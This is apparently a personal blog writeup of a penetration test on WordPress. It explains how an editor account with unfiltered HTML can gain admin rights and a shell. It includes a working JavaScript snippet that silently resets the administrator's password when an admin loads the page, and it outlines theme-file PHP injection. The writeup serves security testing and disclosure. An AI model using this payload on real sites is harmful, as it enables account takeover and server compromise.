---
layout: post
title: "Wordpress [Bugs/Hacks/Tweaks/Tricks]? I am not sure"
categories: Hacks
tags: tricks hacks
image: https://s.w.org/about/images/fanart/logo_500x500.png
---

The following is a writeup of a penetration test which will serve me as a remainder :P. I was up against a wordpress
installation in one of my tests and luckily I already had **editor** level credentials. So I have to somehow obtain a
shell. Remember that editor's do not have the ability to edit/add themes/plugins.

Observing the facts :
+ I can add html in the site (i.e unfiltered_html capability for editors).
+ Nothing more valuable than the above point.

Methods which will not work :
+ Cannot steal cookies of administrator, since **httponly** flag is set on cookies.
+ No dumb popups asking for password because that might create suspicion.

I was unable to find anything on google. So I started poking around a **local wordpress installation** to find ways to
run php i.e escalate privileges and I came across multiple ways to do this. By using some js-fu we can do the
following things and get admin privileges

+ Resetting **admin** password. Enter the following snippet anywhere in the site to reset admin password.

```[javascript]
var siteUrl = 'http://wordpress.org' // Wordpress site url

$(document).ready(function() {
	$.get(siteUrl+"/wp-admin/profile.php?wp_http_referer=%2Fwp-admin%2Fusers.php", function(data) {
		var html = $(data);
		var form = html.find('form');
		form.find('#pass1')[0].value = 't3st'; // New password
		form.find('#pass2')[0].value = 't3st'; // Confirm password
		form.find('#submit')[0].click();
		});
	});
```

+ User roles can be changed by admin in the interface, so the editor account can be made admin using that feature.
+ Admin can write php directly to themes and plugins, so something like [this](https://nealpoole.com/blog/2011/01/how-does-cross-site-scripting-become-arbitrary-code-execution-an-ode-to-the-oft-maligned-referer-header/) can be done.
+ Email address of the admin can also be changed instead of password, then password reset and boom.

Off all the above, I used the third one to write some file of the theme and I got a sweet **shell**. So the crisp of the writeup is

**Even though wordpress doesn't allow editors to write php directly, we can do it in an indirect manner**

I thought this was a bug and reported this information to wordpress guys & they closed the issue as **Won't Fix**,
which is a good news for us, since **editor** accounts are bit easy to obtain :P